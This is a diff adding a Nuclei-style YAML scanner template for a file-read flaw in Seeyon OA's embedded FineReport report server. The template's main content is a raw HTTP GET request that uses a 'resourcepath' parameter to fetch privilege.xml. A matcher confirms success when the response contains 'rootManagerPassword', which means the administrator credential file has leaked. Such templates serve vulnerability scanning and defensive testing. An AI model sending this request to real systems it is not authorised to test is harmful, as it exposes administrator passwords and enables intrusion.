@@ -1,0 +1,30 @@
+id: seeyon-resourcepath-fileread
+info:
+  name: 致远报表 use 帆软报表组件 resourcepath - fileread
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/yqcs/prismx/blob/8b32e33639e031f38d6f9a4dee4b2a15fec1f13e/core/plugins/exploits/%E8%87%B4%E8%BF%9C%E6%8A%A5%E8%A1%A8%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2.yaml#L22
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: seeyon,oa,fileread
+
+http:
+  - raw:
+      - |
+        GET /seeyonreport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'rootManagerPassword')
+        condition: and
